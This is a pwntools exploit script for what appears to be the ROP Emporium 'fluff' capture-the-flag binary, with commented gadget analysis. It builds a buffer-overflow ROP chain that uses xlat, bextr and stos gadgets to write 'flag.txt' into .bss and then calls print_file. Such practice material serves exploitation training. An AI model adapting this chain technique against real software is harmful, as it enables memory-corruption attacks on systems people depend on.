#!/usr/bin/python3
from pwn import *

io = process('./fluff')

"""
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:     ret
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:    ret
   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
"""

"""
xlat maps input bytes via lookup table
"""

"""
bextr extracts bits from rcx into rbx, rdx specifies the start bit and length via bitmask.
"""

"""
stos   BYTE PTR es:[rdi],al stores al into memory at address in rdi

We need pop rdi to pair this with as well as some gadgets concerning rbx and rcx to connect bextr and xlat in order to control al.

Once al is controlled, we have full control over rdi so it should be easy from there.

We know that we will need to use stos to write the bytes to bss. 
"""

add_al_bpl = p64(0x000000000040061e)
pop_rbp = p64(0x0000000000400588)
pop_rdi = p64(0x00000000004006a3)
print_file_call = p64(0x0000000000400620)
xlatb_ret = p64(0x0000000000400628)
bextr_gadget = p64(0x000000000040062a)  # single gadget: pop rdx; pop rcx; add rcx, 0x3ef2; bextr; ret
flag_file = b"flag.txt"
reserved_addr_bss = 0x0000000000601038
stos = p64(0x0000000000400639)
initial_rax = 0xb

# char addresses found by usual offsets after 0x4000000
char_addrs = [
    0x4003c4,  # 'f'
    0x400239,  # 'l'
    0x4003d6,  # 'a'
    0x4003cf,  # 'g'
    0x40024e,  # '.'
    0x400192,  # 't'
    0x400246,  # 'x'
    0x400192,  # 't' again
]

payload = b'A' * 32 + b'B' * 8

for i in range(0, 8):
   payload += pop_rdi
   payload += p64(reserved_addr_bss + i)  # shoved bss into rdi

   if i == 0:
      prev_al = initial_rax  # first al is a section of rax, which is initially 0xb
   else:
      prev_al = flag_file[i-1]

   target_addr = char_addrs[i]
   rcx_val = target_addr - prev_al - 0x3ef2  # compensate for the instruction "add rcx, 0x3ef2"

   payload += bextr_gadget
   payload += p64(0x4000)  # rdx -> rdx = bitmask for bextr (start bit=0, length=64)
   payload += p64(rcx_val)  # rcx -> adjusted target addr offset

   payload += xlatb_ret  # al = rbx[al] (the byte we want to write) is now in al

   payload += stos  # store al into memory at address in rdi which we shoved in earlier

payload += pop_rdi
payload += p64(reserved_addr_bss)
payload += print_file_call

io.recvuntil(b'> ')
io.sendline(payload)
io.interactive()